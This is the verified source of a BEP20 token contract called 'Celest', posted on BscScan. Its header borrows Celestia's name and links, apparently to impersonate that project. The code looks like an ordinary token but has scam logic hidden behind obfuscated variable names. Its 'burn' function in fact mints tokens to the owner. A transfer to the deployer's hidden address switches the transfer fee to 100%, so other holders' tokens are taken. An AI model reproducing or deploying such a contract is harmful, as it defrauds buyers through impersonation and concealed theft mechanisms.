/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

/**
✅ Celestia ✅
✅ The first modular blockchain network to power scalable, secure Web3 apps.
✅ We're hiring! 👉 https://jobs.lever.co/celestia
✅ Github 👉 
✅ https://github.com/celestiaorg
✅ https://celestia.org
✅https://twitter.com/CelestiaOrg
 */
pragma solidity ^0.5.4;
contract Celest {
uint256 public constant totalSupply = 100000000000000000000000000;
address private  gidrzL = address(0);
uint256 public  GGldXr = 10;
string public  symbol = "Celest";
address public  cJRxka = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  pqWxGx = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  TGMuiU = 9;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  fieTYp = address(0);
address public  VYJlTg = address(0);
uint256 private  QZEunR = 10000000000000;
uint256 public  dRQbHx = 8;
uint256 public  fQEFfR = 7;
uint256 public  IVLkIu = 6;
mapping (address => uint256) public balanceOf;
uint256 public constant wgRbCs = 9+1;
uint256 public  mclhxe = 5;
address public  CqRTit = address(0);
address public  CebgwL = address(0);
address public owner;
uint256 public  gMEGnu = 4;
string public  name = "Celest";
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  FhHmzm = 1000000000000000000;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FQERvy");
require(to != address(0), "FQERvy");
require(amount <= balanceOf[from], "FQERvy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* wgRbCs/QZEunR ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==gidrzL){
QZEunR = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
gidrzL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}